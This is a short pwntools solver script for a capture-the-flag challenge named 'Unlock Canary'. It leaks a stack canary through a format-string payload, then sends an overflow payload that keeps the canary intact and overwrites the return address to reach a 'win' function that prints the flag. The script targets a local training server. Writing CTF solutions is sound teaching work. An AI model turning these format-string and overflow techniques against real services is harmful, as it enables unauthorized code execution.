#!/usr/bin/env python3
# * This is the solver script for the Unlock Canary challenge. 
# * Change the parameter number when leaking canary and stack alignment
#   based on the architecture 
from pwn import *

host = "127.0.0.1"              # change to the actual server hostname
port = "61931"                  # change to the updated port

conn = remote(host, port)

BUFFER_LEN = 8
PADDING_LEN = 0                 # 6 bytes padding for ARM64 tho
WIN_ADDR = 0x401423             # address to win function by objdump
#WIN_ADDR = 0x400b38            # for ARM64

print(conn.recvuntil("\nEnter your message:\n"))

# Step 1 Leak Canary
payload = b"%8$llu"             # local canary stored at the 8th argument on AMD64
                                # 4 registers than stack
# payload = b"%12$llu"          # local canary stored at the 12th argument on ARM64
#                               # 8 registers than stack

conn.sendline(payload)

canary = conn.recvuntil("\n")
canary = int(canary.rstrip(b'\r\n'))
print("Canary: " + str(canary))

# Step 2 Control Flow Hijack
# * Overwrite i and run to finish while loop;
# * Overwrite canary and return address with address to win
payload = b"A" * BUFFER_LEN
payload += b"U" * PADDING_LEN
payload += b"Z"                 # i
payload += b"B"                 # run - overwrite to end the while look
payload += p64(canary)          # overwrite local_canary
payload += b"U" * 8             # padding
payload += p64(WIN_ADDR)

conn.recv()
conn.sendline(payload)

conn.recvuntil("flag: ")
print(conn.recv())
conn.close()
